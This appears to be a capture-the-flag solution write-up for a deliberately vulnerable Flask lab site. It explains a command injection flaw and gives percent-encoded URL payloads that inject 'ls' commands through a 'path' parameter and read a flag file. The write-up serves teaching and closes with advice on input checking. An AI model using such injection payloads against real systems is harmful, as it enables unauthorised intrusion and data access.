## Solution

#### Vulnerability

The website is vulnerable to commands injection, as no input checking has been implemented. It is possible to find the *flag.txt* file by injecting *ls* command and navigating over the directories, and later retrieve the contents of it, for example with *cat* command injection or simple directory traversal. Remember to use [Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding) in your query.

#### Correct queries

Correct query is present in the *correct_query* file.

Example command injection steps to get the flag:

1. `IP:PORT/?path=` - Gets the current directory location
2. `IP:PORT/?path=%26ls%20/home/pi/Desktop/SecurityPi/vulnerable_flask/` - Lists what is inside the current directory
3. `IP:PORT/?path=%26ls%20/home/pi/Desktop/SecurityPi/vulnerable_flask/secrets` - Discovers the secrets
4. `IP:PORT/?path=secrets/flag.txt` - Gets the answer

## Conclusion

Remember to implement input checks in every type of application - always assume the user is malicious. If you are unsure how to do that, just use external tools to help you make safe and secure code. Or let others do it for you before you are experienced enough to do it yourself.
